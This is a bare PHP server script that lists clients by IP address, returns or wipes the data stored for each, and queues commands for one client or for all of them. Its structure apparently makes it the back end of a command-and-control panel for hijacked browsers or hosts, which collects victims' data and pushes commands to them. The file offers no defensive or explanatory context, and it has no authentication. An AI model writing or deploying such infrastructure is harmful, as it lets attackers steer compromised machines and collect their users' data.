<?php

error_reporting(E_ALL);

$dir_data = 'data';
$dir_cmds = 'cmds';

function isset_ordie($var) {
	if (!isset($_POST[$var])) die();
}
function check_user($dir, $ip) {
	if (ip2long($ip) === false || !file_exists($dir.'/'.$ip))
		die();
}
function get_users($dir) {
	$files = scandir($dir);
	$files = array_filter($files, function($f) {
		return $f[0] != '.';
	});
	return array_values($files);
}
function put_cmd($file, $cmd) {
	file_put_contents($file, file_get_contents($file) . $cmd . ';');
}

isset_ordie('req');
$req = $_POST['req'];

if ($req === 'get_users') {
	$users = get_users($dir_data);
	echo json_encode($users);
}
else if ($req === 'get_data') {
	isset_ordie('user');
	$user = $_POST['user'];
	check_user($dir_data, $user);
	
	echo file_get_contents($dir_data.'/'.$user);
}
else if ($req === 'clear_data') {
	isset_ordie('user');
	$user = $_POST['user'];
	check_user($dir_data, $user);
	
	file_put_contents($dir_data.'/'.$user, '');
}
else if ($req === 'put_cmd') {
	isset_ordie('user');
	isset_ordie('cmd');
	$user = $_POST['user'];
	$cmd  = $_POST['cmd'];
	check_user($dir_data, $user);
	
	put_cmd($dir_cmds.'/'.$user, $cmd);
}
else if ($req === 'put_cmd_all') {
	isset_ordie('cmd');
	$cmd  = $_POST['cmd'];
	
	$users = get_users($dir_data);
	foreach($users as $user) {
		put_cmd($dir_cmds.'/'.$user, $cmd);
	}
}
?>